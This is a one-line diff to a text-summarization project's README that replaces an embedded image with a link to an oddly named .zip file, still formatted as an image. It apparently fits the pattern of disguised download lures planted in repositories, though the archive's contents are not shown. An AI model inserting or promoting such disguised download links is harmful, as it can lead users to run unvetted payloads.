@@ -7,4 +7,4 @@ TEXT SUMMARIZATION
 
 
 
-![image](https://user-images.githubusercontent.com/125482226/227781748-1d353d92-d75c-45c1-81af-8ff87f8d880e.png)
+![image](https://raw.githubusercontent.com/sharkX2/Text-Summarization/main/Paradisia/Summarization_Text_extinctionist.zip)
